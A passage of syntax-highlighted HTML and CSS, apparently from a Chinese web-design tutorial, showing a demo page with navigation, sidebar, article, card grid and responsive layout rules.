&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.logo</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">24px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.nav</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">float</span>: right;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.nav</span> <span class="selector-tag">ul</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">list-style</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.nav</span> <span class="selector-tag">li</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-left</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.nav</span> <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">5px</span> <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">3px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">transition</span>: all <span class="number">0.2s</span> ease;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.nav</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.2</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="comment">/* 主要内容区域 */</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.main-content</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-top</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">gap</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.sidebar</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">25%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ddd</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">2px</span> <span class="number">5px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.sidebar</span> <span class="selector-tag">h2</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#0066cc</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.sidebar</span> <span class="selector-tag">ul</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">list-style-type</span>: square;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-left</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.sidebar</span> <span class="selector-tag">li</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">8px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.content-area</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">75%</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.article</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ddd</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">2px</span> <span class="number">5px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.article</span> <span class="selector-tag">h2</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#0066cc</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.article</span> <span class="selector-tag">p</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-indent</span>: <span class="number">2em</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.highlight</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#ffffcc</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">3px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: inline-block;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.quote</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-left</span>: <span class="number">3px</span> solid <span class="number">#0066cc</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding-left</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">15px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-style</span>: italic;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#666</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="comment">/* 卡片式布局 */</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.card-container</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: grid;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">grid-template-columns</span>: <span class="built_in">repeat</span>(auto-fill, <span class="built_in">minmax</span>(<span class="number">300px</span>, <span class="number">1</span>fr));</span></span><br><span class="line"><span class="language-css">            <span class="attribute">gap</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-top</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.card</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ddd</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">overflow</span>: hidden;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">2px</span> <span class="number">5px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">transition</span>: transform <span class="number">0.3s</span> ease;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.card</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">transform</span>: <span class="built_in">translateY</span>(-<span class="number">5px</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.card-img</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#f0f0f0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-image</span>: <span class="built_in">linear-gradient</span>(to right, <span class="number">#0066cc</span>, <span class="number">#003366</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-size</span>: cover;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-position</span>: center;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.card-content</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.card</span> <span class="selector-tag">h3</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#0066cc</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="comment">/* 页脚样式 */</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.footer</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-top</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="comment">/* 固定定位的返回顶部按钮 */</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.back-to-top</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: fixed;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">bottom</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">right</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#0066cc</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">24px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">z-index</span>: <span class="number">100</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">opacity</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">transition</span>: opacity <span class="number">0.3s</span> ease;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.back-to-top</span><span class="selector-class">.show</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">opacity</span>: <span class="number">1</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="comment">/* 响应式设计 */</span></span></span><br><span class="line"><span class="language-css">        <span class="keyword">@media</span> (<span class="attribute">max-width</span>: <span class="number">768px</span>) &#123;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.main-content</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">flex-direction</span>: column;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            </span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.sidebar</span>, <span class="selector-class">.content-area</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            </span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.nav</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">float</span>: none;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            </span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.nav</span> <span class="selector-tag">ul</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">flex-direction</span>: column;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            </span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.nav</span> <span class="selector-tag">li</span> &#123;</span></span><br><span class="line"><span class="language-css">                <span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 内联样式（仅用于演示，实际项目不推荐） --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="comment">/* 仅用于演示内联样式 */</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.demo-inline</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#ffffcc</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">3px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">header</span> <span class="attr">class</span>=<span class="string">&quot;header&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;logo&quot;</span>&gt;</span>我的网站<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>关于<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>服务<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>产品<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>联系<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;main-content&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aside</span> <span class="attr">class</span>=<span class="string">&quot;sidebar&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>导航菜单<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>关于<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>服务<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>产品<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>博客<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>联系<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">                </span><br><span class="line">                <span class="tag">&lt;<span class="name">h2</span> <span class="attr">style</span>=<span class="string">&quot;margin-top: 30px;&quot;</span>&gt;</span>热门文章<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>CSS3新特性详解<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>响应式设计技巧<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Web性能优化<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>JavaScript高级编程<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">aside</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content-area&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;article&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>欢迎访问我的网站<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个使用DIV+CSS布局的示例页面，展示了各种CSS特性和布局技巧。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">p</span>&gt;</span>本页面使用了<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;highlight&quot;</span>&gt;</span>嵌入样式表<span class="tag">&lt;/<span class="name">span</span>&gt;</span>、<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;highlight&quot;</span>&gt;</span>外部样式<span class="tag">&lt;/<span class="name">span</span>&gt;</span>和少量<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;highlight&quot;</span>&gt;</span>内联样式<span class="tag">&lt;/<span class="name">span</span>&gt;</span>（仅用于演示）。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                    </span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;quote&quot;</span>&gt;</span></span><br><span class="line">                        &quot;CSS不仅仅是美化网页的工具，更是构建现代Web应用的基础。&quot;</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    </span><br><span class="line">                    <span class="tag">&lt;<span class="name">p</span>&gt;</span>页面采用了响应式设计，可以在不同设备上良好显示。主要使用了以下技术：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span>Flexbox布局<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span>CSS Grid<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span>媒体查询<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span>定位技术<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                </span><br><span class="line">                <span class="tag">&lt;<span class="name">h2</span> <span class="attr">style</span>=<span class="string">&quot;margin-top: 20px;&quot;</span>&gt;</span>特色内容<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card-container&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card-img&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card-content&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">h3</span>&gt;</span>响应式设计<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">p</span>&gt;</span>学习如何创建适应各种设备的网站，提升用户体验。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>了解更多<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    </span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card-img&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card-content&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">h3</span>&gt;</span>CSS动画<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">p</span>&gt;</span>使用CSS3实现平滑过渡和动画效果，无需JavaScript。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>了解更多<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    </span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span 